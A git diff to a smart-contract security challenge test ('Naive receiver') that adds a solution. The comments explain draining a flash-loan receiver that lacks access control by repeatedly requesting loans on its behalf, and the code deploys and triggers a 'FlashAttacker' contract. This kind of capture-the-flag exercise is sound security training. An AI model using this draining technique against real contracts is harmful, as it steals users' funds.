@@ -37,6 +37,13 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
+        // The victim's onFlash loan functino is not protected by access control. 
+        // anyone can call the lender and request a loan on behalf of the victim.
+        // this costs the victim the fee each time. 
+        // This attack is doing so in a loop until the victims balance is 0
+        let attackFactory = await ethers.getContractFactory('FlashAttacker', deployer);
+        let attack = await attackFactory.deploy(pool.address, receiver.address);
+        await attack.connect(player).attack();
         /** CODE YOUR SOLUTION HERE */
     });
 
